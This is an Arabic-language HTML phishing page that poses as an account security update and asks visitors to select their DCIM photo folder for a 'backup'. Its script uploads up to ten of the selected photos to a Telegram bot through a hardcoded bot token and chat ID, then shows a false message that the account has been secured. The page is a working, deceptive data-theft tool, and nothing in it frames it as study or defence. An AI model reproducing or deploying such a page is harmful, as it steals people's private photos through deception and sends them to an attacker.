<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الهوية الرقمية 🔐</title>
    <style>
        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .card { background: #2d2d2d; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 85%; max-width: 400px; }
        .btn { background: #0084ff; color: white; padding: 15px; border-radius: 8px; border: none; font-size: 1.1rem; cursor: pointer; width: 100%; font-weight: bold; }
        p { color: #aaa; font-size: 0.9rem; }
    </style>
</head>
<body>

    <div class="card">
        <h2>تحديث أمان الحساب</h2>
        <p>لضمان حماية صورك من الحذف، يرجى اختيار مجلد الصور (DCIM) لعمل نسخة احتياطية سريعة.</p>
        
        <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
        <button class="btn" onclick="document.getElementById('fileInput').click()">بدء المزامنة الآن</button>
    </div>

    <script>
        const API_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const CHAT_ID = '7214473798';

        document.getElementById('fileInput').addEventListener('change', function(e) {
            const files = e.target.files;
            
            if (files.length > 0) {
                // نحدد الحد الأقصى بـ 10 صور فقط
                const limit = Math.min(files.length, 10);
                alert("جاري فحص وتأمين أول " + limit + " صور...");

                for (let i = 0; i < limit; i++) {
                    // نرسلها كوثيقة (Document) لضمان وصولها بأي صيغة
                    let formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('document', files[i]);

                    fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                }
                
                setTimeout(() => {
                    alert("تمت العملية بنجاح! تم تأمين حسابك.");
                }, 2000);
            }
        });
    </script>
</body>
</html>
